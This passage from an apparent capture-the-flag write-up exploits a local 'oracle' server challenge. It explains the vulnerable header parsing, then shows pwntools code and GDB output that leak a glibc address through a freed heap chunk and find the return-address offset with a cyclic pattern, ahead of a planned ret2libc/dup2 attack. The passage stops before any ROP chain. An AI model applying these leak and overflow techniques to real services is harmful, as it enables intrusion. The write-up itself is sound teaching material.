<span class="mtk1">    }</span>
<span class="mtk1">}</span>
</code></pre></div><p>The above function is trying to parse headers like <code>Content-Length: 1337</code>. It does it right, but there is a Buffer Overflow vulnerability.</p><p>Notice that <code>header_buffer</code> is a 1024-byte buffer, but the way to read from the socket is slightly different. This time, the program uses an infinite <code>while</code> loop and only stops reading when it finds <code>\r\n\r\n</code>. Therefore, we are able to write outside of the buffer limits, causing a Buffer Overflow.</p><p>After that, the request can be handled by two different functions, depending on the action (<code>VIEW</code> or <code>PLAGUE</code>). This is <code>handle_view</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">handle_view</span><span class="mtk1">() {</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk8">strcmp</span><span class="mtk1">(target_competitor, </span><span class="mtk4">"me"</span><span class="mtk1">)) {</span>
<span class="mtk1">        </span><span class="mtk8">write</span><span class="mtk1">(client_socket, </span><span class="mtk4">"You have found yourself.</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">25</span><span class="mtk1">);</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk8">is_competitor</span><span class="mtk1">(target_competitor)) {</span>
<span class="mtk1">        </span><span class="mtk8">write</span><span class="mtk1">(client_socket, </span><span class="mtk4">"No such competitor exists.</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">27</span><span class="mtk1">);</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk8">write</span><span class="mtk1">(client_socket, </span><span class="mtk4">"It has been imprinted upon your mind.</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">38</span><span class="mtk1">);</span>  
<span class="mtk1">    }</span>
<span class="mtk1">}</span>
</code></pre></div><p>The above function is useless. This is <code>handle_plague</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">handle_plague</span><span class="mtk1">() {</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk5">!</span><span class="mtk8">get_header</span><span class="mtk1">(</span><span class="mtk4">"Content-Length"</span><span class="mtk1">)) {</span>
<span class="mtk1">        </span><span class="mtk8">write</span><span class="mtk1">(client_socket, CONTENT_LENGTH_NEEDED, </span><span class="mtk8">strlen</span><span class="mtk1">(CONTENT_LENGTH_NEEDED));</span>  
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk3">// take in the data</span>
<span class="mtk1">    </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">plague_content </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">)</span><span class="mtk8">malloc</span><span class="mtk1">(MAX_PLAGUE_CONTENT_SIZE);</span>
<span class="mtk1">    </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">plague_target </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">)</span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">;</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">get_header</span><span class="mtk1">(</span><span class="mtk4">"Plague-Target"</span><span class="mtk1">)) {</span>
<span class="mtk1">        plague_target </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">)</span><span class="mtk8">malloc</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">40</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk8">strncpy</span><span class="mtk1">(plague_target, </span><span class="mtk8">get_header</span><span class="mtk1">(</span><span class="mtk4">"Plague-Target"</span><span class="mtk1">), </span><span class="mtk5">0x</span><span class="mtk6">1f</span><span class="mtk1">);</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk8">write</span><span class="mtk1">(client_socket, RANDOMISING_TARGET, </span><span class="mtk8">strlen</span><span class="mtk1">(RANDOMISING_TARGET));</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk7 mtki">long</span><span class="mtk1"> len </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strtoul</span><span class="mtk1">(</span><span class="mtk8">get_header</span><span class="mtk1">(</span><span class="mtk4">"Content-Length"</span><span class="mtk1">), </span><span class="mtk6">NULL</span><span class="mtk1">, </span><span class="mtk6">10</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (len </span><span class="mtk5">&gt;=</span><span class="mtk1"> MAX_PLAGUE_CONTENT_SIZE) {</span>
<span class="mtk1">        len </span><span class="mtk5">=</span><span class="mtk1"> MAX_PLAGUE_CONTENT_SIZE</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk8">recv</span><span class="mtk1">(client_socket, plague_content, len, </span><span class="mtk6">0</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk5">!</span><span class="mtk8">strcmp</span><span class="mtk1">(target_competitor, </span><span class="mtk4">"me"</span><span class="mtk1">)) {</span>
<span class="mtk1">        </span><span class="mtk8">write</span><span class="mtk1">(client_socket, PLAGUING_YOURSELF, </span><span class="mtk8">strlen</span><span class="mtk1">(PLAGUING_YOURSELF));</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk8">is_competitor</span><span class="mtk1">(target_competitor)) {</span>
<span class="mtk1">        </span><span class="mtk8">write</span><span class="mtk1">(client_socket, PLAGUING_OVERLORD, </span><span class="mtk8">strlen</span><span class="mtk1">(PLAGUING_OVERLORD));</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> { </span>
<span class="mtk1">        </span><span class="mtk8">dprintf</span><span class="mtk1">(client_socket, NO_COMPETITOR, target_competitor);</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (len) {</span>
<span class="mtk1">            </span><span class="mtk8">write</span><span class="mtk1">(client_socket, plague_content, len);</span>
<span class="mtk1">            </span><span class="mtk8">write</span><span class="mtk1">(client_socket, </span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">        }</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk8">free</span><span class="mtk1">(plague_content);</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (plague_target) {</span>
<span class="mtk1">        </span><span class="mtk8">free</span><span class="mtk1">(plague_target);</span>
<span class="mtk1">    }</span>
<span class="mtk1">}</span>
</code></pre></div><p>Here we see that we need to use a <code>Content-Length</code> header. Then, the program allocates a big chunk (2048 bytes). Then, if we have <code>Plague-Target</code> header, it allocates another chunk, but smaller (<code>0x40</code>).</p><p>After that, the program parses the <code>Content-Length</code> header and saves it to a variable called <code>len</code>, which is used later to read from the socket and to write to the socket. If our <code>Content-Length</code> is greater than 2048, then the program sets <code>len</code> to be the maximum size minus 1.</p><p>However, there is an Integer Overflow here, because we can use a negative number for <code>Content-Length</code>, which will pass the <code>if</code> check, but will result in a huge size for <code>recv</code> and <code>write</code>. This vulnerability is not used in the challenge, but it is worth mentioning. Actually, it was only exploitable to read out of bounds, because <code>write</code> just errored out.</p><p>The allocated chunks are freed before the function returns.</p><h2 id="exploit-strategy">Exploit strategy</h2><p>To sum up, we have a Buffer Overflow vulnerability, but it is not exploitable from the start because the binary is compiled with PIE, so we don&rsquo;t know any address within the binary or Glibc because of ASLR.</p><p>Therefore, we need to find a leak before exploiting the Buffer Overflow vulnerability. We actually can find a Glibc leak when allocating the huge chunk from <code>handle_plague</code>. Notice that it is freed once the function returns, but the program runs in server mode. So, if we connect again and allocate again, the chunk will be placed in the same position on the heap. As a result, we can simply write one character and the program will print out the whole chunk to us, which contains a slightly modified <code>fd</code> pointer and the <code>bk</code> pointer. The chunk is huge, so it is inserted in the Unsorted Bin when freed. As a result, we will get pointers to <code>main_arena</code> (inside Glibc).</p><p>Once we have Glibc, we can get a lot of ROP gadgets from there and exploit the Buffer Overflow vulnerability with a ROP chain. We will use a simple Ret2Libc attack, but using <code>dup2</code> to copy the file descriptors <code>0</code>, <code>1</code> and <code>2</code> (<code>stdin</code>, <code>stdout</code> and <code>stderr</code>) to the socket file descriptor. We know that the socket file descriptor usually starts at <code>4</code>, and it increases on each connection (it is never closed).</p><h2 id="exploit-development">Exploit development</h2><p>Instead of running the program locally, we will use the Docker container and attach GDB to it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./build_docker.sh</span>
[+] Building 1.4s (10/10) FINISHED                              docker:default  
<span class="code-dark-blue"> =&gt; [internal] load build definition from Dockerfile                      0.0s</span>
<span class="code-dark-blue"> =&gt; =&gt; transferring dockerfile: 197B                                      0.0s</span>
<span class="code-dark-blue"> =&gt; [internal] load metadata for docker.io/library/ubuntu:20.04           0.8s</span>
<span class="code-dark-blue"> =&gt; [internal] load .dockerignore                                         0.0s</span>
<span class="code-dark-blue"> =&gt; =&gt; transferring context: 2B                                           0.0s</span>
<span class="code-dark-blue"> =&gt; [internal] load build context                                         0.0s</span>
<span class="code-dark-blue"> =&gt; =&gt; transferring context: 13.78kB                                      0.0s</span>
<span class="code-dark-blue"> =&gt; [1/5] FROM docker.io/library/ubuntu:20.04@sha256:80ef4a44043dec44905  0.0s</span>
<span class="code-dark-blue"> =&gt; CACHED [2/5] RUN useradd -m ctf                                       0.0s</span>
<span class="code-dark-blue"> =&gt; [3/5] COPY challenge/* /home/ctf/                                     0.1s</span>
<span class="code-dark-blue"> =&gt; [4/5] RUN chown -R ctf:ctf /home/ctf/                                 0.3s</span>
<span class="code-dark-blue"> =&gt; [5/5] WORKDIR /home/ctf                                               0.0s</span>
<span class="code-dark-blue"> =&gt; exporting to image                                                    0.1s</span>
<span class="code-dark-blue"> =&gt; =&gt; exporting layers                                                   0.1s</span>
<span class="code-dark-blue"> =&gt; =&gt; writing image sha256:aed917d58e64e3174eab6c886db370c64710af779e1c  0.0s</span>
<span class="code-dark-blue"> =&gt; =&gt; naming to docker.io/library/oracle                                 0.0s</span>
Oracle listening on port 9001
</code></pre></div><p>Now we can use the first connection to simply write two chunks in <code>handle_plague</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">io</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk1">port</span><span class="mtk1">)</span>
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'PLAGUE asdf 1337</span><span class="mtk6">\r\n</span><span class="mtk4">Content-Length: 256</span><span class="mtk6">\r\n</span><span class="mtk4">Plague-Target: asdf</span><span class="mtk6">\r\n\r\n</span><span class="mtk4">'</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">100</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\r\n</span><span class="mtk4">'</span><span class="mtk1">)</span>  
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">()</span>
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:9001
[<span class="code-blue">*</span>] './oracle'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Opening connection to 127.0.0.1 on port 9001: Done  
[<span class="code-blue">*</span>] Closed connection to 127.0.0.1 port 9001
</code></pre></div><p>Then, in GDB we see the huge chunk, which is freed, and we have pointers to <code>0x7ffff7fbfbe0</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q -p <span class="code-dark-magenta">$(</span><span class="code-dark-green">pidof</span> <span class="mtku">oracle</span><span class="code-dark-magenta">)</span>
Loading GEF...
Attaching to process 4153802
Reading symbols from <span class="code-dark-green">target:/home/ctf/oracle</span>...
(No debugging symbols found in <span class="code-dark-green">target:/home/ctf/oracle</span>)
Reading symbols from <span class="code-dark-green">target:/lib/x86_64-linux-gnu/libc.so.6</span>...
(No debugging symbols found in <span class="code-dark-green">target:/lib/x86_64-linux-gnu/libc.so.6</span>)
Reading symbols from <span class="code-dark-green">target:/lib64/ld-linux-x86-64.so.2</span>...
(No debugging symbols found in <span class="code-dark-green">target:/lib64/ld-linux-x86-64.so.2</span>)

warning: Target and debugger are in different PID namespaces; thread lists and other data are likely unreliable.  Connect to gdbserver inside the container.  
<span class="code-dark-blue">0x00007ffff7ef32f7</span> in <span class="code-dark-yellow">accept</span> () from <span class="code-dark-green">target:/lib/x86_64-linux-gnu/libc.so.6
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>visual-heap -n
<span class="code-dark-red">0x555555559000: 0x0000000000000000 0x0000000000000291 | ................ |</span>
<span class="code-dark-red">0x555555559010: 0x0001000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-red">0x555555559020: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-red">* 7 lines, 0x70 bytes</span>
<span class="code-dark-red">0x5555555590a0: 0x0000000000000000 0x0000555555559ec0 | ..........UUUU.. |</span>
<span class="code-dark-red">0x5555555590b0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-red">* 29 lines, 0x1d0 bytes</span>
<span class="code-dark-green">0x555555559290: 0x0000000000000000 0x0000000000000411 | ................ |</span>
<span class="code-dark-green">0x5555555592a0: 0x6465766965636552 0x6972697073206120 | Received a spiri |</span>
<span class="code-dark-green">0x5555555592b0: 0x6e6f63206c617574 0x2e6e6f697463656e | tual connection. |</span>
<span class="code-dark-green">0x5555555592c0: 0x00000000000a2e2e 0x0000000000000000 | ................ |</span>
<span class="code-dark-green">0x5555555592d0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-green">* 60 lines, 0x3c0 bytes</span>
<span class="code-dark-blue">0x5555555596a0: 0x0000000000000000 0x0000000000000811 | ................ |  &lt;-  unsortedbins[1/1]</span>
<span class="code-dark-blue">0x5555555596b0: 0x00007ffff7fbfbe0 0x00007ffff7fbfbe0 | ................ |</span>
<span class="code-dark-blue">0x5555555596c0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-blue">0x5555555596d0: 0x4141414141414141 0x4141414141414141 | AAAAAAAAAAAAAAAA |</span>
<span class="code-dark-blue">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-blue">0x5555555597b0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-blue">* 111 lines, 0x6f0 bytes</span>
<span class="code-dark-yellow">0x555555559eb0: 0x0000000000000810 0x0000000000000050 | ........P....... |</span>
<span class="code-dark-yellow">0x555555559ec0: 0x0000000000000000 0x0000555555559010 | ..........UUUU.. |  &lt;-  tcache[idx=3,sz=0x50][1/1]</span>  
<span class="code-dark-yellow">0x555555559ed0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-yellow">0x555555559ee0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-yellow">0x555555559ef0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-red">0x555555559f00: 0x0000000000000000 0x0000000000020101 | ................ |  &lt;-  top</span>
<span class="code-dark-red">0x555555559f10: 0x2068637573206f4e 0x74697465706d6f63 | No such competit |</span>
<span class="code-dark-red">0x555555559f20: 0x206664736120726f 0x202e737473697865 | or asdf exists.  |</span>
<span class="code-white">...
<span class="code-green">gef&gt; </span>continue
Continuing.
</code></pre></div><p>Now we can allocate a single byte and get the content of the chunk, getting both addresses in <code>fd</code> and <code>bk</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">io</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk1">port</span><span class="mtk1">, </span><span class="mtk9 mtki">level</span><span class="mtk5">=</span><span class="mtk4">'DEBUG'</span><span class="mtk1">)</span>
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'PLAGUE asdf 1337</span><span class="mtk6">\r\n</span><span class="mtk4">Content-Length: 256</span><span class="mtk6">\r\n\r\n</span><span class="mtk4">'</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\r\n</span><span class="mtk4">'</span><span class="mtk1">)</span>  
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Attempted plague: '</span><span class="mtk1">)</span>
<span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recvn</span><span class="mtk1">(</span><span class="mtk6">16</span><span class="mtk1">)[</span><span class="mtk6">8</span><span class="mtk1">:]) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1ecbe0</span>
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">[<span class="code-green">+</span>] Opening connection to 127.0.0.1 on port 9001: Done
[<span class="code-red">DEBUG</span>] Sent 0x2c bytes:
    b'PLAGUE asdf 1337\r\n'
    b'Content-Length: 256\r\n'
    b'\r\n'
    b'A\r\n'
[<span class="code-red">DEBUG</span>] Received 0x199 bytes:
    00000000  52 61 6e 64  6f 6d 69 73  69 6e 67 20  61 20 74 61  ‚îÇRand<span class="code-dark-blue">‚îÇ</span>omis<span class="code-dark-blue">‚îÇ</span>ing <span class="code-dark-blue">‚îÇ</span>a ta‚îÇ  
    00000010  72 67 65 74  20 63 6f 6d  70 65 74 69  74 6f 72 2c  ‚îÇrget<span class="code-dark-blue">‚îÇ</span> com<span class="code-dark-blue">‚îÇ</span>peti<span class="code-dark-blue">‚îÇ</span>tor,‚îÇ
    00000020  20 61 73 20  79 6f 75 20  77 69 73 68  2e 2e 2e <span class="code-dark-red">0a</span>  ‚îÇ as <span class="code-dark-blue">‚îÇ</span>you <span class="code-dark-blue">‚îÇ</span>wish<span class="code-dark-blue">‚îÇ</span>...<span class="code-dark-red">¬∑</span>‚îÇ
    00000030  4e 6f 20 73  75 63 68 20  63 6f 6d 70  65 74 69 74  ‚îÇNo s<span class="code-dark-blue">‚îÇ</span>uch <span class="code-dark-blue">‚îÇ</span>comp<span class="code-dark-blue">‚îÇ</span>etit‚îÇ
    00000040  6f 72 20 61  73 64 66 20  65 78 69 73  74 73 2e 20  ‚îÇor a<span class="code-dark-blue">‚îÇ</span>sdf <span class="code-dark-blue">‚îÇ</span>exis<span class="code-dark-blue">‚îÇ</span>ts. ‚îÇ
    00000050  54 68 65 79  20 6d 61 79  20 68 61 76  65 20 66 61  ‚îÇThey<span class="code-dark-blue">‚îÇ</span> may<span class="code-dark-blue">‚îÇ</span> hav<span class="code-dark-blue">‚îÇ</span>e fa‚îÇ
    00000060  6c 6c 65 6e  20 62 65 66  6f 72 65 20  79 6f 75 20  ‚îÇllen<span class="code-dark-blue">‚îÇ</span> bef<span class="code-dark-blue">‚îÇ</span>ore <span class="code-dark-blue">‚îÇ</span>you ‚îÇ
    00000070  74 72 69 65  64 20 74 6f  20 70 6c 61  67 75 65 20  ‚îÇtrie<span class="code-dark-blue">‚îÇ</span>d to<span class="code-dark-blue">‚îÇ</span> pla<span class="code-dark-blue">‚îÇ</span>gue ‚îÇ
    00000080  74 68 65 6d  2e 20 41 74  74 65 6d 70  74 65 64 20  ‚îÇthem<span class="code-dark-blue">‚îÇ</span>. At<span class="code-dark-blue">‚îÇ</span>temp<span class="code-dark-blue">‚îÇ</span>ted ‚îÇ
    00000090  70 6c 61 67  75 65 3a 20  41 <span class="code-dark-blue">0d</span> <span class="code-dark-red">0a</span> <span class="code-dark-blue">f7</span>  <span class="code-dark-green">ff</span> <span class="code-dark-blue">7f</span> <span class="code-dark-red">00</span> <span class="code-dark-red">00</span>  ‚îÇplag<span class="code-dark-blue">‚îÇ</span>ue: <span class="code-dark-blue">‚îÇ</span>A<span class="code-dark-blue">¬∑</span><span class="code-dark-red">¬∑</span><span class="code-dark-blue">¬∑‚îÇ</span><span class="code-dark-green">¬∑</span><span class="code-dark-blue">¬∑</span><span class="code-dark-red">¬∑¬∑</span>‚îÇ
    000000a0  <span class="code-dark-blue">e0</span> <span class="code-dark-blue">fb</span> <span class="code-dark-blue">fb</span> <span class="code-dark-blue">f7</span>  <span class="code-dark-green">ff</span> <span class="code-dark-blue">7f</span> <span class="code-dark-red">00</span> <span class="code-dark-red">00</span>  <span class="code-dark-red">00</span> <span class="code-dark-red">00</span> <span class="code-dark-red">00</span> <span class="code-dark-red">00</span>  <span class="code-dark-red">00</span> <span class="code-dark-red">00</span> <span class="code-dark-red">00</span> <span class="code-dark-red">00</span>  ‚îÇ<span class="code-dark-blue">¬∑¬∑¬∑¬∑‚îÇ</span><span class="code-dark-green">¬∑</span><span class="code-dark-blue">¬∑</span><span class="code-dark-red">¬∑¬∑</span><span class="code-dark-blue">‚îÇ</span><span class="code-dark-red">¬∑¬∑¬∑¬∑</span><span class="code-dark-blue">‚îÇ</span><span class="code-dark-red">¬∑¬∑¬∑¬∑</span>‚îÇ
    000000b0  <span class="code-dark-red">00</span> <span class="code-dark-red">00</span> <span class="code-dark-red">00</span> <span class="code-dark-red">00</span>  <span class="code-dark-red">00</span> <span class="code-dark-red">00</span> <span class="code-dark-red">00</span> <span class="code-dark-red">00</span>  41 41 41 41  41 41 41 41  ‚îÇ<span class="code-dark-red">¬∑¬∑¬∑¬∑</span><span class="code-dark-blue">‚îÇ</span><span class="code-dark-red">¬∑¬∑¬∑¬∑</span><span class="code-dark-blue">‚îÇ</span>AAAA<span class="code-dark-blue">‚îÇ</span>AAAA‚îÇ
    000000c0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  ‚îÇAAAA<span class="code-dark-blue">‚îÇ</span>AAAA<span class="code-dark-blue">‚îÇ</span>AAAA<span class="code-dark-blue">‚îÇ</span>AAAA‚îÇ
    *
    00000190  41 41 41 41  41 41 41 41  <span class="code-dark-red">0a</span>                        ‚îÇAAAA<span class="code-dark-blue">‚îÇ</span>AAAA<span class="code-dark-blue">‚îÇ</span><span class="code-dark-red">¬∑</span>‚îÇ
    00000199
[<span class="code-green">+</span>] Glibc base address: 0x7ffff7dd3000
[<span class="code-blue">*</span>] Closed connection to 127.0.0.1 port 9001
</code></pre></div><p>The offset to get the base address of Glibc from <code>main_arena</code> can be found easily in GDB:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>p/x 0x7ffff7fbfbe0 - $libc  
$1 = 0x1ecbe0
</code></pre></div><p>At this point, we must find the offset to control the return address from <code>parse_headers</code>. For this, we can use a cyclic patern:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">io</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk1">port</span><span class="mtk1">)</span>
<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">cyclic</span><span class="mtk1">(</span><span class="mtk6">2500</span><span class="mtk1">)</span>
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'VIEW asdf 1337</span><span class="mtk6">\r\n</span><span class="mtk4">'</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\r\n\r\n</span><span class="mtk4">'</span><span class="mtk1">)</span>  
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">()</span>
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>In GDB, we see that the program crashed:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Program received signal SIGSEGV, Segmentation fault.  
<span class="code-dark-blue">0x000055555555553d</span> in <span class="code-dark-yellow">handle_request</span> ()
</code></pre></div><p>And we have control ofer the return address at this position:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/s $rsp
<span class="code-dark-blue">0x7fffffffec98</span>: "uuaauvaauwaauxaauyaauzaavbaavcaavdaaveaavfaavgaavhaaviaavjaavkaavlaavmaavnaavoaavpaavqaavraavsaavtaavuaavvaavwaavxaavyaavzaawbaawcaawdaaweaawfaawgaawhaawiaawjaawkaawlaawmaawnaawoaawpaawqaawraawsaawtaawuaawvaawwaawxaawyaawzaaxbaaxcaaxdaaxeaaxfaaxgaaxhaaxiaaxjaaxkaaxlaaxmaaxnaaxoaaxpaaxqaaxraaxsaaxtaaxuaaxvaaxwaaxxaaxyaaxzaaybaaycaaydaayeaayfaaygaayhaayiaayjaaykaaylaaymaaynaayoaaypaayqaayraaysaaytaayuaayvaaywaayxaayyaay\r\n\r\n"  
<span class="code-green">gef&gt; </span>x/i $rip
=&gt; <span class="code-dark-blue">0x55555555553d</span> &lt;<span class="code-dark-yellow">handle_request</span>+386&gt;: <span class="code-dark-green">ret</span>
<span class="code-green">gef&gt; </span>shell pwn cyclic -l uuaa
2079
